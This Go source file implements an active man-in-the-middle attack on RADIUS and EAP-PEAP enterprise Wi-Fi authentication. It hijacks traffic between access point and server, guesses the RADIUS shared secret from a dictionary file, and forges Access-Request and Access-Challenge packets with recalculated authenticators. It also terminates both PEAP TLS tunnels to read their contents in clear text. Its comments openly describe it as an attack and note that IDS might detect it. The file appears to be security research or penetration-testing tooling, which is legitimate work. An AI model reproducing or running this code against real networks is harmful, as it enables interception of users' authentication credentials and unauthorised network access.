package main

import (
	"crypto/rand"
	"flag"
	"fmt"
	"net"
	"radius/eap"
	"radius/radius"
	"radius/session"
)

const authPort = 1812
const accPort = 1813

const hostName = "169.254.63.10"

const wireless80211Port = 19

var mySession session.Session

func manglePacket(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UDPAddr, clientToServer bool) bool {

	var client, server net.UDPAddr

	forward := true

	//Determine client and server
	if clientToServer {
		client = from
		server = to
	} else {
		client = to
		server = from
	}

	if server.Port == accPort {
		return true //At the moment, we do not do anything for Accounting messages
	}

	fmt.Println()
	fmt.Println()
	fmt.Println()

	fmt.Println("¡¡¡PACKAGE RECEIVED!!!")

	//Print some useful information about the packet
	fmt.Println("Pck rcv from ", from, "to", to)
	fmt.Println("Code:", manglePacket.GetCode())
	fmt.Println("Id:", manglePacket.GetId())

	//Get the session context by means of the client address
	context := session.GetContextByClient(client)

	if manglePacket.GetCode() == radius.AccessChallenge {

		//Now, we know the state attribute
		if ok, state := manglePacket.GetState(); ok {
			context.SetState(state)
		}

	}

	if manglePacket.GetCode() == radius.AccessRequest {

		//Retrieve basic information about the client
		//NAS Port Type
		if ok, nasPortType := manglePacket.GetNASPortType(); ok {
			context.SetNasPortType(nasPortType)

			if nasPortType == wireless80211Port {
				fmt.Println("WIFI network Authetication!!")

				//Set the current user name if not done before
				if ok, user := manglePacket.GetUserName(); ok {
					context.SetUserName(user)
				}

				//Set calling station
				if ok, callingSta := manglePacket.GetCallingSTAID(); ok {
					context.SetCallingStation(callingSta)
				}

			}

		}

		//NAS Port
		if ok, nasPort := manglePacket.GetNASPort(); ok {
			context.SetNasPort(nasPort)
		}

		//NAS IP
		if ok, nasIP := manglePacket.GetNASIp(); ok {
			context.SetNasIP(nasIP)
		}

		//Called STA
		if ok, calledSTA := manglePacket.GetCalledSTAID(); ok {
			context.SetCalledStation(calledSTA)
		}

		//Framed MTU
		if ok, framedMTU := manglePacket.GetFramedMTU(); ok {
			context.SetFramedMTU(framedMTU)
		}

		//Connect Info
		if ok, connectInfo := manglePacket.GetConnectInfo(); ok {
			context.SetConnectInfo(connectInfo)
		}

		//Acc Session
		if ok, accSession := manglePacket.GetAccountSession(); ok {
			context.SetAccSessionID(accSession)
		}

	}

	//TODO Detect Desired auth type method for EAP.

	//Check if there are EAP messages...

	if ok, eapMsg := manglePacket.GetEAPMessage(); ok {

		//fmt.Println("eapMsg:", eapMsg)

		var eapHeader eap.HeaderEap

		ok = eapHeader.Decode(eapMsg)

		if ok {
			fmt.Println("EAP Decode Code:", eapHeader.GetCode())
			fmt.Println("EAP Decode ID:", eapHeader.GetId())
			fmt.Println("EAP Decode Type:", eapHeader.GetType())
			fmt.Println("EAP Decode Length:", eapHeader.GetLength())

			if eapHeader.GetCode() == eap.EAPRequest || eapHeader.GetCode() == eap.EAPResponse {
				eapPacket := eap.GetEAPByType(eapHeader.GetType())

				ok = eapPacket.Decode(eapMsg)

				if ok {
					fmt.Println("EAP decoded")

					switch eapPacket.GetType() {
					case eap.Identity:
						identPacket := eapPacket.(*eap.EapIdentity)
						if manglePacket.GetCode() == radius.AccessRequest {
							context.SetEAPIdentity(identPacket.GetIdentity()) //Set EAP identity
						} else {

							fmt.Println("Eap identity not expected in this message")
						}
					case eap.LegacyNak:
						legacyNak := eapPacket.(*eap.EapNak)

						fmt.Println("Desired Eap method type to authenticate:", legacyNak.GetDesiredType())

						context.SetEapMethod(uint8(legacyNak.GetDesiredType())) //Set desired EAP method

					case eap.Peap:
						peapPacket := eapPacket.(*eap.EapPeap)
						if manglePacket.GetCode() == radius.AccessChallenge && peapPacket.GetCode() == eap.EAPRequest {
							forward = manageServerPeap(manglePacket, from, to, peapPacket, context, clientToServer)
						}

						//Manage client TLS Session
						if manglePacket.GetCode() == radius.AccessRequest && peapPacket.GetCode() == eap.EAPResponse {
							forward = manageNASPeap(manglePacket, from, to, peapPacket, context, clientToServer)
						}

					}
				}
			}

		}

	}

	//Used to determine if we have already the secret, because we have broken it or it is available in the database
	status := context.GetSecretStatus()

	//Check the status concerning the secret for the current context
	switch status {
	case session.SecretUnknown:
		fmt.Println("No secret")
		fmt.Println("Determine secret")
		mySession.GuessSecret(manglePacket.Clone(), client, server, clientToServer)

	case session.SecretOk:

	}

	context.PrintInfo()

	return forward

}

func manageServerPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UDPAddr, peapPacket *eap.EapPeap, context *session.ContextInfo, clientToServer bool) bool {

	if peapPacket.GetStartFlag() { //A TLS session is about to start
		fmt.Println("PEAP session about to start.")

		//Create a TLS session

		context.CreateTLSSession()

		tlsSession := context.GetTLSSession()

		rawTLSToServer := tlsSession.GetServerTunnel().ReadRaw()
		//rawTLSToServer := tlsSession.ServerReadRaw()

		fmt.Println("rawTLSToServer:", rawTLSToServer)

		//At this point, we start to manage the session. Send EAP response to server
		craftedPacket := craftPacketFromTLSPayload(context, rawTLSToServer, manglePacket.GetId()+1, peapPacket.GetId(), !clientToServer, [16]byte{})

		//Send crafted message
		mySession.SendPacket(craftedPacket, !clientToServer)

		//Update handshake status
		tlsSession.SetServerHandShakeStatus(1) //First handshake packet sent

		//Return true here, as we forward the packet so that the NAS Starts also a TLS session with us ;)
		return true
	}

	tlsPayload := peapPacket.GetTLSPayload()

	if len(tlsPayload) > 0 {

		tlsSession := context.GetTLSSession()

		if peapPacket.GetLengthFlag() {
			context.SetServerTLSLength(peapPacket.GetTLSTotalLength())
		}

		context.AddTLSServerPayload(tlsPayload)

		//Check whether we have the whole TLS packet or not.
		if peapPacket.GetMoreFlag() {

			fmt.Println("¡¡¡¡¡More frags detected from server!!!!!")

			//Send ACK Eap Message to the Server
			craftedPacket := craftPacketFromTLSPayload(context, nil, manglePacket.GetId()+1,
				peapPacket.GetId(), !clientToServer, [16]byte{})

			//Send crafted message
			mySession.SendPacket(craftedPacket, !clientToServer)

		} else {

			payload, length := context.GetAndDeleteServerTLSPayloadAndLength()

			if uint32(len(payload)) != length {
				fmt.Println("EAPMessage --> Length mismatch!!")
			}

			tlsSession.GetServerTunnel().WriteRaw(payload)

			if tlsSession.GetServerHandShakeStatus() < 2 {

				rawPayload := tlsSession.GetServerTunnel().ReadRaw()

				//Send Eap Message with TLS handshake to the Server
				craftedPacket := craftPacketFromTLSPayload(context, rawPayload, manglePacket.GetId()+1,
					peapPacket.GetId(), !clientToServer, [16]byte{})

				//Send crafted message
				mySession.SendPacket(craftedPacket, !clientToServer)

				tlsSession.SetServerHandShakeStatus(2)

			} else if tlsSession.GetServerHandShakeStatus() == 2 {
				//We received the last TLS handshake message

				//Send ACK message to Server
				craftedPacket := craftPacketFromTLSPayload(context, nil, manglePacket.GetId()+1,
					peapPacket.GetId(), !clientToServer, [16]byte{})

				//Send crafted message
				mySession.SendPacket(craftedPacket, !clientToServer)

				tlsSession.SetServerHandShakeStatus(3)

			} else {
				//TLS Payload to handle
				tlsContent := tlsSession.ReadTLSFromServer()

				onTLSData(tlsContent, context, manglePacket.GetId(), peapPacket.GetId(), clientToServer)

			}

		}

	}

	//By default, do not forward the message
	return false

}

func manageNASPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UDPAddr, peapPacket *eap.EapPeap, context *session.ContextInfo, clientToServer bool) bool {

	tlsSession := context.GetTLSSession()

	if !peapPacket.GetLengthFlag() && !peapPacket.GetMoreFlag() && !peapPacket.GetStartFlag() && len(peapPacket.GetTLSPayload()) == 0 {
		//Received Peap Ack message

		if tlsSession.GetNASHandShakeStatus() == 2 { //The handshake process has finished
			tlsSession.SetNASHandShakeStatus(3) //Ack from the client to tell us the TLS session succeded
		}

		//As attacker, we decide to not split the Eap messages into different Radius packets. We avoid handling splitted Eap messages and therefore,
		//the reception of an ACK message should only happen after TLS handshake process has finished, but on the other side,
		//we are "signing" our attack that can be detected by IDS and algorithms of anomaly detection.

	}

	tlsPayload := peapPacket.GetTLSPayload()

	if len(tlsPayload) > 0 {

		if peapPacket.GetLengthFlag() {
			context.SetNASTLSLength(peapPacket.GetTLSTotalLength())
		}

		context.AddTLSNASPayload(tlsPayload)

		//Check whether we have the whole TLS packet or not.
		if peapPacket.GetMoreFlag() {

			//Send ACK Eap Message to the Client
			craftedPacket := craftPacketFromTLSPayload(context, nil, manglePacket.GetId(),
				peapPacket.GetId()+1, !clientToServer, manglePacket.GetAuthenticator())

			//Send crafted message
			mySession.SendPacket(craftedPacket, !clientToServer)

		} else {
			payload, length := context.GetAndDeleteNASTLSPayloadAndLength()

			if uint32(len(payload)) != length {
				fmt.Println("EAPMessage --> Length mismatch!!")
			}

			tlsSession.GetNASTunnel().WriteRaw(payload)
			//tlsSession.NASWriteRaw(payload)

			//Check handshake status
			if tlsSession.GetNASHandShakeStatus() < 2 {

				fmt.Println("Read 1!!")

				//Start asynchronous read so that the TLS server side process the handshakes
				tlsSession.GetNASTunnel().ReadTlsAsync()
				//tlsSession.NASReadTLS()

				//Read the handshake packet generated by the server
				rawResponse := tlsSession.GetNASTunnel().ReadRaw()
				fmt.Println("Read 2!!")

				//Send ACK Eap Message to the Client
				craftedPacket := craftPacketFromTLSPayload(context, rawResponse, manglePacket.GetId(),
					peapPacket.GetId()+1, !clientToServer, manglePacket.GetAuthenticator())

				//Send crafted message
				mySession.SendPacket(craftedPacket, !clientToServer)

				//Go to the following step
				tlsSession.SetNASHandShakeStatus(tlsSession.GetNASHandShakeStatus() + 1)

			} else if tlsSession.GetNASHandShakeStatus() == 3 {
				//First message after Handshake
				//Get the asynchronous data
				tlsContent := <-tlsSession.GetNASTunnel().GetReadTLSChannel()
				onTLSData(tlsContent, context, manglePacket.GetId(), peapPacket.GetId(), clientToServer)

			} else {

				tlsContent := tlsSession.GetNASTunnel().ReadTls()
				onTLSData(tlsContent, context, manglePacket.GetId(), peapPacket.GetId(), clientToServer)

			}

		}

	}
	//Packet is not forwarded to the server. Otherwise, the server will be confused when processing legitimate packets and illicit ones.

	return false

}

func craftPacketFromTLSPayload(context *session.ContextInfo, payload []byte, msgID uint8, eapID uint8, clientToServer bool, authenticator [16]byte) *radius.RadiusPacket {

	//fmt.Println("Authenticator", hex.Dump(authenticator[:]))

	//fmt.Println("craftPacketFromTLSPayload Send packet")

	craftedPacket := radius.NewRadiusPacket()
	craftedPacket.SetId(msgID)

	eapMessage := eap.NewEapPeap()
	eapMessage.SetId(eapID)

	//Add TLS payload
	if payload != nil {
		eapMessage.SetTLSPayload(payload)
	}

	if clientToServer {

		craftedPacket.SetCode(radius.AccessRequest)
		eapMessage.SetCode(eap.EAPResponse)

		//Set NAS context into the packet
		craftedPacket.SetUserName(context.GetUserName())
		craftedPacket.SetNASIp(context.GetNasIP())
		craftedPacket.SetCalledSTAID(context.GetCalledStation())
		craftedPacket.SetNASPortType(context.GetNasPortType())
		craftedPacket.SetNASPort(context.GetNasPort())
		craftedPacket.SetCallingSTAID(context.GetCallingStation())
		craftedPacket.SetConnectInfo(context.GetConnectInfo())
		craftedPacket.SetAccountSession(context.GetAccSessionID())
		craftedPacket.SetFramedMTU(context.GetFramedMTU())

		//Generate random Authenticator

		_, err := rand.Read(authenticator[:])

		if err != nil {
			fmt.Println("Error in random function", err)
			return nil
		}

	} else {

		craftedPacket.SetCode(radius.AccessChallenge)
		eapMessage.SetCode(eap.EAPRequest)

	}

	if ok, encodedPEAP := eapMessage.Encode(); ok {
		craftedPacket.SetEAPMessage(encodedPEAP)
	}

	craftedPacket.SetState(context.GetState())

	//We need to recalculate this attribute, otherwise, the message will be rejected
	radius.RecalculateMsgAuth(craftedPacket, authenticator, context.GetSecret())

	//Calculate Response Authenticator for Access Challenge packets
	if craftedPacket.GetCode() == radius.AccessChallenge {
		if ok, auth := radius.CalculateResponseAuth(craftedPacket, authenticator, context.GetSecret()); ok {
			craftedPacket.SetAuthenticator(auth)
		}

	}

	return craftedPacket

}

//This method will receive the content of the TLS session in clear text, no ciphers
func onTLSData(tlsContent []byte, context *session.ContextInfo, msgID uint8, eapID uint8, clientToServer bool) {
	fmt.Println("onTLSData. Data:", tlsContent)

}

func main() {

	secrets := flag.String("secrets", "secrets.txt", "Secrets file to perform dictionary attacks")

	flag.Parse()

	session.SetConfig(*secrets)

	//Init session

	mySession.Init(session.Active, hostName, authPort, accPort)

	mySession.Hijack(manglePacket)
}
